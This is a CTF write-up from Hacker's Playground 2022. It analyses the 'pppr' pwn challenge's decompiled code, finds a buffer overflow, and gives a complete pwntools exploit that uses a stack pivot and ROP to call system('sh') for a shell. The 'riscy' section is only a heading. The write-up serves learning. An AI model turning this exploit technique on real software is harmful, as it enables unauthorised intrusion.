# Hacker's Playground 2022

A 24h CTF Organized by Security Team of Samsung Research.

I played as a member of Soteria Team & together, we ranked 21th out of more than 700 teams.

I really enjoyed playing in this CTF & I wished it would be longer. There were some creative & hard challenges that were fun to play & discover. I've managed to solve 2 pwn challenges, helped in few & made progress in few other challenges.

------------

- [Pwn](#Pwn)
    -  [pppr](#pwn1 "Writeup")
	-  [riscy](#pwn2 "Writeup")

------------

### Pwn
1. <p name="pwn1">pppr</p>

For this one, we were given a [decompiled source code](/2022/Hacker's%20Playground%202022/sources/decompiled.c) from IDA & a x86 binary. Looking at the source code, we have a function used to read from `stdin`, this should be an equivalent to `fgets`:

```c
int __cdecl r(int a1, unsigned int a2, int a3)
{
  int result; // eax
  char v4; // [esp+3h] [ebp-9h]
  unsigned int i; // [esp+4h] [ebp-8h]

  if ( a3 )
  {
    puts("r() works only for stdin.");
    result = -1;
  }
  else
  {
    for ( i = 0; a2 > i; ++i )
    {
      v4 = fgetc(stdin);
      if ( v4 == -1 || v4 == 10 )
        break;
      *(_BYTE *)(a1 + i) = v4;
    }
    *(_BYTE *)(i + a1) = 0;
    result = i;
  }
  return result;
}
```

Looking at our main

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[4]; // [esp+0h] [ebp-8h] BYREF

  setbuf(stdin, 0);
  setbuf(stdout, 0);
  alarm(0xAu);

  r(v4, 64, 0);
  return 0;
}
```

We are clearly able to write out of bound of `v4` variable, this is our **BOF**. We also have the function `system` used in function `x` therefore we can use this instead of a **ret2libc**.

Checking the security of the binary, we have PIE disabled so we can write our `/bin/sh` into the binary & use it to call `system`. Later on I used `sh` only instead of `/bin/sh`, luckly `/bin` was in the `PATH` variable.

Plan is, write `sh` to a known & writeable address alongside a `system` address to call it with `sh` string. We then stack pivot to that address to make our call & get a shell. Solver:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pppr")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("pppr.sstf.site", 1337)

    return r


def main():
    r = conn()
    
    writeable = 0x804a000+0xa00
    leave_ret = 0x08048643
    
    payload = b"A"*8
    payload += p32(writeable+len('sh')+26) # ebp
    payload += p32(exe.symbols.r)
    payload += p32(leave_ret) # ret to leave - Stack pivot
    payload += p32(writeable)
    payload += p32(0x100)
    payload += p32(0)
    
    r.sendline(payload)
    
    payload2 = b'sh\0' 
    payload2 += b'A'*25 # padding
    payload2 += p32(0)
    payload2 += p32(exe.symbols.x)
    payload2 += p32(0)
    payload2 += p32(writeable)
    
    pause()
    r.sendline(payload2)

    r.interactive() # SCTF{Anc13nt_x86_R0P_5kiLl}


if __name__ == "__main__":
    main()
```

<br />

1. <p name="pwn2">riscy</p>